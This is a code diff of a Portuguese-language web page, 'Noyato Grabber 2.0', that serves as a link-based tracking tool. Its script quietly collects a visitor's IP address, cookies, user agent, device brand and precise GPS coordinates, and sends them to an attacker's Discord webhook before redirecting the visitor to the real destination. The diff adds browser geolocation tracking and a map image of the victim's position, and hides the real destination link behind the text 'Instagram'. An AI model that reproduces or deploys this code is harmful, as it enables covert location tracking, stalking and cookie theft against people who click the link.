@@ -155,7 +155,7 @@
 </head>
 <body>
 <h1>Noyato Grabber 2.0 - Dados Completos</h1>
-<p class="description">esse site e basicamente um grabber de ip, localização, operadora, e os coockies, apenas com webhoocks e algumas apis, use com responsabilidade.</p>
+<p class="description">Esse site é basicamente um grabber de IP, localização (tracking via navegador), operadora, e cookies, apenas com webhooks e algumas APIs, use com responsabilidade.</p>
 <div class="container" id="input-container">
   <label for="destUrl">URL de destino (ex: https://example.com)</label>
   <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
@@ -178,6 +178,7 @@
   <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
 </details>
 <script>
+  // Extrai query params da URL
   function getQueryParams() {
     const params = {};
     const queryString = window.location.search.substring(1);
@@ -227,7 +228,7 @@
     outputDiv.scrollIntoView({behavior:"smooth"});
   });
 
-  // Função para coletar cookies (limitado pelo domínio e permissões)
+  // Função para acessar cookies (limitado por domínio)
   function collectCookies() {
     try {
       return document.cookie || "Nenhum cookie disponível";
@@ -236,7 +237,7 @@
     }
   }
 
-  // Função para detectar se navegador é móvel e extrair marca do dispositivo (ex: Samsung)
+  // Detecta marca do dispositivo pelo userAgent
   function getDeviceBrand() {
     const ua = navigator.userAgent.toLowerCase();
     if(/samsung/.test(ua)) return "Samsung";
@@ -251,7 +252,7 @@
     return "Desconhecido/Não detectado";
   }
 
-  // Função para coletar dados e enviar via webhook
+  // Envia os dados ao webhook e redireciona
   (async function executeGrabberIfNeeded() {
     const params = getQueryParams();
     if (!params.dest || !params.wh) {
@@ -262,7 +263,7 @@
     inputContainer.style.display = "none";
     outputDiv.style.display = "none";
 
-    // Coleta IP público
+    // Coleta IP público via API externa
     let ip = "Desconhecido";
     try {
       const ipResp = await fetch("https://api.ipify.org?format=json");
@@ -270,50 +271,75 @@
       ip = ipJson.ip || ip;
     } catch {}
 
-    // Dados geográficos do IP com api.ipapi.co para BR e com muitos dados estruturados
-    let geo = {};
-    try {
-      const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
-      geo = await geoResp.json();
-    } catch {}
-
-    // Coleção cookies, userAgent e device info
+    // Coleta cookies, userAgent, deviceBrand
     const cookies = collectCookies();
     const userAgent = navigator.userAgent || "Desconhecido";
     const deviceBrand = getDeviceBrand();
-    const dateTime = new Date().toLocaleString("pt-BR", {timeZone: geo.timezone || "UTC"});
+    const dateTime = new Date().toLocaleString("pt-BR", {timeZone: "UTC"});
 
-    // Valor importante: Provedor de internet (ISP) brasileiro (se disponível)
-    const isp = geo.org || geo.asn || "Desconhecido";
+    // Pega localização pelo navegador via Geolocation API (tracking)
+    function getPosition() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          return reject("Geolocalização não suportada");
+        }
+        navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err));
+      });
+    }
 
-    // Montagem dos campos do embed do Discord com destaque para dados importantes
+    let latitude = "Desconhecida";
+    let longitude = "Desconhecida";
+    let accuracy = "Desconhecida";
+
+    try {
+      const pos = await getPosition();
+      latitude = pos.coords.latitude.toFixed(6);
+      longitude = pos.coords.longitude.toFixed(6);
+      accuracy = pos.coords.accuracy + " metros";
+    } catch {
+      // Usuário negou ou não forneceu localização
+    }
+
+    // Monta imagem do mapa via Google Static Maps (sem expor URL da API)
+    // [IMPORTANTE] Troque 'YOUR_GOOGLE_MAPS_API_KEY' por sua chave real para funcionar
+    const mapBaseUrl = "https://maps.googleapis.com/maps/api/staticmap";
+    const marker = `&markers=color:red%7C${latitude},${longitude}`;
+    const mapSize = "&size=600x300";
+    const zoom = "&zoom=15";
+    const mapKeyPlaceholder = "YOUR_GOOGLE_MAPS_API_KEY"; // Não mostrar chave real para esconder link API
+
+    const mapUrl = latitude !== "Desconhecida" && longitude !== "Desconhecida" ?
+      `${mapBaseUrl}?center=${latitude},${longitude}${zoom}${mapSize}${marker}&key=${mapKeyPlaceholder}` : null;
+
+    // Monta embed Discord
     const webhookUrl = params.wh;
     const destUrl = decodeURIComponent(params.dest);
 
-    // Campos formatados com seleção do que priorizar
-    const fields = [
+    let fields = [
       { name: "🔴 IP", value: ip, inline: true },
-      { name: "🌍 País", value: geo.country_name || "Desconhecido", inline: true },
-      { name: "📍 Estado", value: geo.region || "Desconhecido", inline: true },
-      { name: "🏙 Cidade", value: geo.city || "Desconhecido", inline: true },
-      { name: "🏘 Bairro", value: geo.suburb || "Desconhecido", inline: true },
-      { name: "🛣 Rua", value: geo.street || "Desconhecido", inline: true },
-      { name: "📮 CEP", value: geo.postal || "Desconhecido", inline: true },
-      { name: "📡 ISP / Provedor", value: isp, inline: true },
-      { name: "📅 Data e Hora", value: dateTime, inline: true },
+      { name: "📍 Latitude", value: latitude, inline: true },
+      { name: "📍 Longitude", value: longitude, inline: true },
+      { name: "📏 Precisão", value: accuracy, inline: true },
       { name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true },
       { name: "🖥 Navegador / Sistema", value: userAgent, inline: false },
       { name: "🍪 Cookies (limitados)", value: cookies.length > 1024 ? cookies.slice(0,1024) + "..." : cookies, inline: false },
-      { name: "🔗 Link de Destino", value: `[Clique aqui](${destUrl})`, inline: false },
+      { name: "🔗 Link de Destino", value: "Instagram", inline: false }
     ];
 
+    // Opcional: adiciona campo com a URL real do destino escondida atrás do texto "Instagram"
+    // o valor é só "Instagram" para não expor o link real.
+
     const embed = {
-      title: "⚠️ Novo clique no IP Grabber - FULL DATA",
+      title: "⚠️ Novo clique no IP Grabber - TRACKING",
       color: 0xff0000,
       fields,
       timestamp: new Date().toISOString(),
-      footer: { text: "Discord Bot by Noyato154" },
+      footer: { text: "Discord Bot by Noyato154" }
     };
+
+    if (mapUrl) {
+      embed.image = { url: mapUrl };
+    }
 
     // Envia para webhook
     try {
@@ -326,7 +352,7 @@
       console.error("Falha ao enviar webhook:", e);
     }
 
-    // Redireciona 3 segundos depois para o link
+    // Redireciona 3 segundos depois para o link real
     setTimeout(() => {
       window.location.href = destUrl;
     }, 3000);
@@ -334,7 +360,7 @@
 </script>
 <div class="footer">
   Desenvolvido por noyato154 <br />
-  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer">
+  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-icon" />
   </a>
 </div>
